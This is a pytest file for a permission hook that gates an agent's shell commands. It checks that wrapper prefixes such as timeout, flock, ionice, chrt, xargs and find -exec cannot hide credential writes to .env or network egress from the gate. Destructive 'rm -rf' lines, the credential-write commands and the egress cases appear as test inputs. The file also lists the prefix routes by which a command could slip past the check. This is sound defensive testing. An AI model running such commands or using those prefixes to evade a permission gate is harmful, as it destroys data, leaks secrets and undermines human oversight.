        # Deletion is OUT OF SCOPE for this gate by recorded ruling (the hook's own
        # ruling, quoted rather than located by line: "rm -rf, DROP TABLE and TRUNCATE
        # are OUT OF SCOPE on purpose". CITED BY TEXT ON PURPOSE: this citation has gone
        # stale twice, once per cycle, because each cycle inserts header lines ABOVE the
        # ruling it points at, so a line number is wrong by construction here.
        # `rm` matches no write arm, so this stays silent after the fix exactly as
        # it was measured before it.
        assert _extract("find . | xargs rm") == set()

    def test_xargs_rm_rf_stays_silent(self):
        assert _extract("ls | xargs rm -rf src") == set()

    def test_timeout_rm_rf_stays_silent(self):
        assert _extract("timeout 5 rm -rf src") == set()

    @pytest.mark.parametrize("flag", sorted(nested_cmd_flags(_extractor_src())))
    def test_the_find_exec_deferral_is_closed_for_every_flag(self, flag):
        # WAS `test_all_four_find_exec_spellings_stay_silent`, which asserted
        # set() and pinned the deferral so it stayed visible. Cycle Q closes it:
        # the nested command is spliced into `segments`, so cmd0 resolves to
        # `cp`. The flag axis is DERIVED from the hook's own NESTED_CMD_FLAGS
        # (four members as of this cycle: -exec, -execdir, -ok, -okdir), so a
        # flag added later is covered here without an edit. Terminator forms,
        # consumers, the egress half and the accepted costs are in
        # tests/test_bash_nested_command_gate.py.
        cmd = r"find . -name x %s cp {} %s \;" % (flag, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_no_false_positive_on_this_repos_own_test_command(self):
        # The one false-positive risk the fix could plausibly introduce: `timeout`
        # now resolves `python` as the verb, but inline_form returns "" for a `-m`
        # invocation, so the interpreter-arg scan produces no hits.
        cmd = "timeout 300 .venv/bin/python -m pytest tests/test_bash_write_gate.py"
        assert _extract(cmd) == set(), cmd

    def test_flock_no_false_positive_on_this_repos_own_test_command(self):
        """The same false-positive risk as above, now for flock: inline_form still returns
        "" for a `-m` invocation, so the interpreter-arg scan produces no hits. Reddens if
        `inline_form` starts returning "flag" for a `-m` invocation."""
        cmd = "flock /tmp/l.lock .venv/bin/python -m pytest tests/test_bash_write_gate.py"
        assert _extract(cmd) == set(), cmd

    def test_flock_rm_rf_stays_silent(self):
        """Deletion is out of scope for this gate by the same recorded ruling as the
        `timeout`/`xargs` cases above. Reddens if an `rm` arm is added to the cmd0 write
        arms."""
        assert _extract("flock /tmp/l.lock rm -rf src") == set()


# --------------------------------------------------------------------------- #
# 7. one prefix proved at the decision layer, not only the extractor layer
# --------------------------------------------------------------------------- #
class TestFullHookPrefixProof:
    def test_timeout_prefixed_egress_asks_naming_the_host_through_the_real_hook(
        self, tmp_path: Path
    ):
        sid = "wrap-pfx-egress-sid"
        _seed(sid, mode="conversation")
        cmd = "timeout 5 %s" % EGRESS_CMD
        out = _run_hook(cmd, sid, str(tmp_path))
        assert out is not None, "the prefixed egress command was silent"
        assert out.get("permissionDecision") == "ask", out
        assert EGRESS_HOST in out.get("permissionDecisionReason", ""), out

    # -- cycle S: the three prefixes measured blind through this exact layer this
    # session (see module docstring). Both proofs per prefix, matching the dispatch
    # brief's explicit ask, not only the single representative capabilities.md lists.
    @pytest.mark.parametrize("prefix,cmd", [
        ("flock", "flock /tmp/l.lock cp %s .env" % SRC),
        ("ionice", "ionice -c3 cp %s .env" % SRC),
        ("chrt", "chrt -b 0 cp %s .env" % SRC),
    ], ids=["flock", "ionice", "chrt"])
    def test_prefixed_credential_write_denies_through_the_real_hook(
        self, prefix, cmd, tmp_path: Path
    ):
        """MEASURED blind today at this exact layer (module docstring). Reddens under the
        `WRAPPERS` key rename for this prefix: the hook returns to silence and no decision
        at all instead of a SEC-CREDENTIAL-WRITE deny."""
        sid = "wrap-pfx-cred-%s-sid" % prefix
        _seed(sid, mode="conversation")
        out = _run_hook(cmd, sid, str(tmp_path))
        assert out is not None, (prefix, cmd, "the prefixed credential write was silent")
        assert out.get("permissionDecision") == "deny", (prefix, out)
        assert "SEC-CREDENTIAL-WRITE" in out.get("permissionDecisionReason", ""), (prefix, out)

    @pytest.mark.parametrize("prefix,cmd", [
        ("flock", "flock /tmp/l.lock %s" % EGRESS_CMD),
        ("ionice", "ionice -c3 %s" % EGRESS_CMD),
        ("chrt", "chrt -b 0 %s" % EGRESS_CMD),
    ], ids=["flock", "ionice", "chrt"])
    def test_prefixed_egress_asks_naming_the_host_through_the_real_hook(
        self, prefix, cmd, tmp_path: Path
    ):
        """MEASURED blind today at this exact layer (module docstring). Reddens under the
        same `WRAPPERS` key rename: the hook returns to silence instead of an `ask` naming
        the host."""
        sid = "wrap-pfx-egress2-%s-sid" % prefix
        _seed(sid, mode="conversation")
        out = _run_hook(cmd, sid, str(tmp_path))
        assert out is not None, (prefix, cmd, "the prefixed egress command was silent")
        assert out.get("permissionDecision") == "ask", (prefix, out)
        assert EGRESS_HOST in out.get("permissionDecisionReason", ""), (prefix, out)


# --------------------------------------------------------------------------- #
# 8. the uncovered-prefix ratchet's own parser, proven against synthetic source
#    (not the real hook's prose) so both directions of the consistency check are
#    shown to redden rather than merely reasoned about.
# --------------------------------------------------------------------------- #
class TestUncoveredPrefixRatchetIsBidirectional:
    def test_the_block_parses_names_only(self):
        src = (
            "# UNCOVERED PREFIXES BEGIN (names only)\n"
            "# find -exec, find -execdir, xargs\n"
            "# UNCOVERED PREFIXES END\n"
        )
        assert uncovered_prefix_names(src) == {"find -exec", "find -execdir", "xargs"}

    def test_a_name_kept_uncovered_after_its_prefix_is_covered_is_an_overlap(self):
        # Proves "closing a prefix without updating the block" actually reddens:
        # `xargs` is both named uncovered AND present in the covered set.
        src = (
            "# UNCOVERED PREFIXES BEGIN\n"
            "# find -exec, xargs\n"
            "# UNCOVERED PREFIXES END\n"
        )
        names = uncovered_prefix_names(src)
        covered = {"xargs", "sudo"}
        overlap = {n for n in names if n.split()[0] in covered}
        assert overlap == {"xargs"}, overlap

    def test_a_genuinely_uncovered_name_produces_no_overlap(self):
        # The healthy case: nothing named uncovered is also a WRAPPERS key.
        src = (
            "# UNCOVERED PREFIXES BEGIN\n"
            "# find -exec, coproc\n"
            "# UNCOVERED PREFIXES END\n"
        )
        names = uncovered_prefix_names(src)
        covered = {"xargs", "sudo"}
        overlap = {n for n in names if n.split()[0] in covered}
        assert not overlap, overlap


# --------------------------------------------------------------------------- #
# 9. the fix is conditional: mutating the mechanism reddens exactly the cells it
#    is load-bearing for, and nothing else. Reuses _mutate / _mutated_extract
#    from tests/test_bash_group_construct_gate.py, which assert the mutation
#    target exists before mutating, so a stale target cannot silently pass.
# --------------------------------------------------------------------------- #
def _mutated_egress(mutated_src: str, cmd: str, cwd: str = CWD) -> set[tuple[str, str]]:
    env = dict(os.environ, WRIT_BASH_CMD=cmd, WRIT_CWD=cwd)
    p = subprocess.run([sys.executable, "-c", mutated_src], env=env,
                       capture_output=True, text=True)
    return {(parts[1], parts[2]) for line in p.stdout.splitlines()
            if len(parts := line.split("\t", 2)) == 3 and parts[0] == "egress"}


class TestTheFixIsConditional:
    def test_removing_the_xargs_wrapper_entry_reddens_its_write_and_egress_cells(self):
        src = _extractor_src()
        mutated = _mutate(src, '"xargs": (', '"xargs_disabled": (')
        assert mutated != src

        write_cmd = "ls | xargs cp %s %s" % (SRC, TARGET)
        got_write = _mutated_extract(mutated, write_cmd)
        assert EXPECTED_TARGET not in got_write, got_write

        egress_cmd = "ls | xargs %s" % EGRESS_CMD
        got_egress = _mutated_egress(mutated, egress_cmd)
        assert not any(h == EGRESS_HOST for h, _d in got_egress), got_egress

    def test_removing_the_timeout_wrapper_entry_reddens_its_write_and_egress_cells(self):
        src = _extractor_src()
        mutated = _mutate(src, '"timeout": (', '"timeout_disabled": (')
        assert mutated != src

        write_cmd = "timeout 5 cp %s %s" % (SRC, TARGET)
        got_write = _mutated_extract(mutated, write_cmd)
        assert EXPECTED_TARGET not in got_write, got_write

        egress_cmd = "timeout 5 %s" % EGRESS_CMD
        got_egress = _mutated_egress(mutated, egress_cmd)
        assert not any(h == EGRESS_HOST for h, _d in got_egress), got_egress

    def test_removing_the_flock_wrapper_entry_reddens_its_write_and_egress_cells(self):
        src = _extractor_src()
        mutated = _mutate(src, '"flock": (', '"flock_disabled": (')
        assert mutated != src

        write_cmd = "flock /tmp/l.lock cp %s %s" % (SRC, TARGET)
        got_write = _mutated_extract(mutated, write_cmd)
        assert EXPECTED_TARGET not in got_write, got_write

        egress_cmd = "flock /tmp/l.lock %s" % EGRESS_CMD
        got_egress = _mutated_egress(mutated, egress_cmd)
        assert not any(h == EGRESS_HOST for h, _d in got_egress), got_egress

    def test_removing_the_ionice_wrapper_entry_reddens_its_write_and_egress_cells(self):
        src = _extractor_src()
        mutated = _mutate(src, '"ionice": (', '"ionice_disabled": (')
        assert mutated != src

        write_cmd = "ionice -c3 cp %s %s" % (SRC, TARGET)
        got_write = _mutated_extract(mutated, write_cmd)
        assert EXPECTED_TARGET not in got_write, got_write

        egress_cmd = "ionice -c3 %s" % EGRESS_CMD
        got_egress = _mutated_egress(mutated, egress_cmd)
        assert not any(h == EGRESS_HOST for h, _d in got_egress), got_egress

    def test_removing_the_chrt_wrapper_entry_reddens_its_write_and_egress_cells(self):
        src = _extractor_src()
        mutated = _mutate(src, '"chrt": (', '"chrt_disabled": (')
        assert mutated != src

        write_cmd = "chrt -b 0 cp %s %s" % (SRC, TARGET)
        got_write = _mutated_extract(mutated, write_cmd)
        assert EXPECTED_TARGET not in got_write, got_write

        egress_cmd = "chrt -b 0 %s" % EGRESS_CMD
        got_egress = _mutated_egress(mutated, egress_cmd)
        assert not any(h == EGRESS_HOST for h, _d in got_egress), got_egress

    def test_neutering_wrapper_positionals_reddens_flock_and_chrt_while_ionice_and_nice_stay_green(
        self,
    ):
        """Grows the existing timeout/nice pair (plan.md: "its test simply gains the flock
        and chrt assertions") rather than duplicating a parallel test. flock and chrt both
        have a WRAPPER_POSITIONALS entry, so both drop; ionice has none (table-only, no
        positional of its own), so it stays green exactly like nice."""
        src = _extractor_src()
        mutated = _mutate(src, "WRAPPER_POSITIONALS.get(name, 0)", "0")
        assert mutated != src

        timeout_cmd = "timeout 5 cp %s %s" % (SRC, TARGET)
        got_timeout = _mutated_extract(mutated, timeout_cmd)
        assert EXPECTED_TARGET not in got_timeout, got_timeout

        flock_cmd = "flock /tmp/l.lock cp %s %s" % (SRC, TARGET)
        got_flock = _mutated_extract(mutated, flock_cmd)
        assert EXPECTED_TARGET not in got_flock, got_flock

        chrt_cmd = "chrt -b 0 cp %s %s" % (SRC, TARGET)
        got_chrt = _mutated_extract(mutated, chrt_cmd)
        assert EXPECTED_TARGET not in got_chrt, got_chrt

        nice_cmd = "nice -n 5 cp %s %s" % (SRC, TARGET)
        got_nice = _mutated_extract(mutated, nice_cmd)
        assert EXPECTED_TARGET in got_nice, got_nice

        ionice_cmd = "ionice -c3 cp %s %s" % (SRC, TARGET)
        got_ionice = _mutated_extract(mutated, ionice_cmd)
        assert EXPECTED_TARGET in got_ionice, got_ionice

    def test_forcing_the_positional_shape_check_true_reddens_non_shaped_positionals(self):
        """RETARGETED (plan.md): `DURATION.match(dequote(seg[i]))` no longer exists once
        the per-wrapper shape table lands; this targets its replacement,
        `WRAPPER_POSITIONAL_SHAPES[name].match(dequote(seg[i]))`, directly, so a stale
        target fails loudly via `_mutate`'s own precondition rather than passing
        vacuously. Covers both timeout's non-duration positional (unchanged from before)
        and chrt's priority-less positional (new this cycle): forcing the shape test to
        True wrongly skips a token that was never shape-checked, one for each wrapper."""
        src = _extractor_src()
        mutated = _mutate(
            src, "WRAPPER_POSITIONAL_SHAPES[name].match(dequote(seg[i]))", "True")
        assert mutated != src

        timeout_cmd = "timeout cp %s %s" % (SRC, TARGET)
        got_timeout = _mutated_extract(mutated, timeout_cmd)
        assert EXPECTED_TARGET not in got_timeout, got_timeout

        chrt_cmd = "chrt -b cp %s %s" % (SRC, TARGET)
        got_chrt = _mutated_extract(mutated, chrt_cmd)
        assert EXPECTED_TARGET not in got_chrt, got_chrt

    def test_doubling_flocks_positional_count_reddens_the_nested_timeout_case(self):
        """Capability's own named mutation: flock's WRAPPER_POSITIONALS count changed from
        1 to 2. A second (shape-checked-as-LOCK_TARGET-so-effectively-unconditional) skip
        consumes `timeout` itself instead of leaving it to be recognized as its own nested
        wrapper, so `cp` is never reached."""
        src = _extractor_src()
        mutated = _mutate(
            src,
            'WRAPPER_POSITIONALS = {"timeout": 1, "flock": 1, "chrt": 1}',
            'WRAPPER_POSITIONALS = {"timeout": 1, "flock": 2, "chrt": 1}',
        )
        assert mutated != src

        cmd = "flock /tmp/l.lock timeout 5 cp %s %s" % (SRC, TARGET)
        got = _mutated_extract(mutated, cmd)
        assert EXPECTED_TARGET not in got, got

    def test_swapping_flocks_shape_to_priority_reddens_the_ordinary_lock_path_case(self):
        """Reddens capability: an ordinary non-numeric lock path stops being skipped once
        flock's shape is wrongly forced numeric (PRIORITY), and `l.lock` is misresolved as
        the verb instead of `cp`."""
        src = _extractor_src()
        mutated = _mutate(
            src,
            'WRAPPER_POSITIONAL_SHAPES = {"timeout": DURATION, "flock": LOCK_TARGET, '
            '"chrt": PRIORITY}',
            'WRAPPER_POSITIONAL_SHAPES = {"timeout": DURATION, "flock": PRIORITY, '
            '"chrt": PRIORITY}',
        )
        assert mutated != src

        cmd = "flock /tmp/l.lock cp %s %s" % (SRC, TARGET)
        got = _mutated_extract(mutated, cmd)
        assert EXPECTED_TARGET not in got, got

    def test_moving_flocks_timeout_flag_to_novalue_reddens_the_spaced_value_form(self):
        """Reddens capability: `-w`'s spaced value `5` is left unconsumed once `-w` is ALSO
        classified NOVALUE (verb_at checks novalue membership before value membership, so
        adding a flag to NOVALUE overrides its VALUE membership rather than needing it
        removed there too); the lock target that follows is then misresolved instead of
        `cp`."""
        src = _extractor_src()
        mutated = _mutate(
            src, "FLOCK_NOVALUE_FLAGS = frozenset({",
            'FLOCK_NOVALUE_FLAGS = frozenset({"-w", "--timeout", ',
        )
        assert mutated != src

        cmd = "flock -w 5 /tmp/l.lock cp %s %s" % (SRC, TARGET)
        got = _mutated_extract(mutated, cmd)
        assert EXPECTED_TARGET not in got, got

    def test_moving_ionices_class_flag_to_novalue_reddens_the_spaced_value_form(self):
        """Reddens capability: `-c`'s spaced value `3` is left unconsumed once `-c` is ALSO
        classified NOVALUE, and `3` is misresolved as the verb instead of `cp`."""
        src = _extractor_src()
        mutated = _mutate(
            src, "IONICE_NOVALUE_FLAGS = frozenset({",
            'IONICE_NOVALUE_FLAGS = frozenset({"-c", "--class", ',
        )
        assert mutated != src

        cmd = "ionice -c 3 cp %s %s" % (SRC, TARGET)
        got = _mutated_extract(mutated, cmd)
        assert EXPECTED_TARGET not in got, got

    def test_moving_chrts_sched_runtime_flag_to_novalue_reddens_the_spaced_value_form(self):
        """Reddens capability: `-T`'s spaced value `1000` is misread as the priority once
        `-T` is ALSO classified NOVALUE, and the real priority (or the next flag) is
        misresolved as the verb instead of `cp`."""
        src = _extractor_src()
        mutated = _mutate(
            src, "CHRT_NOVALUE_FLAGS = frozenset({",
            'CHRT_NOVALUE_FLAGS = frozenset({"-T", "--sched-runtime", ',
        )
        assert mutated != src

        cmd = "chrt -T 1000 -b 0 cp %s %s" % (SRC, TARGET)
        got = _mutated_extract(mutated, cmd)
        assert EXPECTED_TARGET not in got, got


def _dict_key_names(source: str, dict_name: str) -> set[str]:
    """The string keys of a module-level `NAME = {...}` dict literal in the extractor
    source, parsed rather than restated here -- the same posture as wrapper_names in
    tests/test_bash_write_gate.py, applied to WRAPPER_POSITIONALS and
    WRAPPER_POSITIONAL_SHAPES."""
    for node in ast.walk(ast.parse(source)):
        if (isinstance(node, ast.Assign)
                and any(getattr(t, "id", "") == dict_name for t in node.targets)
                and isinstance(node.value, ast.Dict)):
            return {k.value for k in node.value.keys if isinstance(k, ast.Constant)}
    raise AssertionError("%s table not found in the extractor source" % dict_name)


# --------------------------------------------------------------------------- #
# 10. WRAPPER_POSITIONALS and WRAPPER_POSITIONAL_SHAPES must name the same
#     wrappers, or the extractor raises the first time an unmatched wrapper's
#     positional is stepped (plan.md: a bare subscript, not `.get` with a default,
#     is deliberate so a table drift reddens HERE at test time).
# --------------------------------------------------------------------------- #
class TestTheTablesAreConsistent:
    def test_both_tables_are_non_empty(self):
        """Reddens if either table's derivation returns nothing, which would make the
        parity check below pass vacuously."""
        src = _extractor_src()
        assert _dict_key_names(src, "WRAPPER_POSITIONALS")
        assert _dict_key_names(src, "WRAPPER_POSITIONAL_SHAPES")

    def test_the_two_tables_name_the_same_wrappers(self):
        """Reddens when a positional entry is added without a matching shape entry (or vice
        versa), which would otherwise raise an uncaught KeyError inside the extractor the
        first time that wrapper's positional is stepped."""
        src = _extractor_src()
        assert _dict_key_names(src, "WRAPPER_POSITIONALS") == _dict_key_names(
            src, "WRAPPER_POSITIONAL_SHAPES")
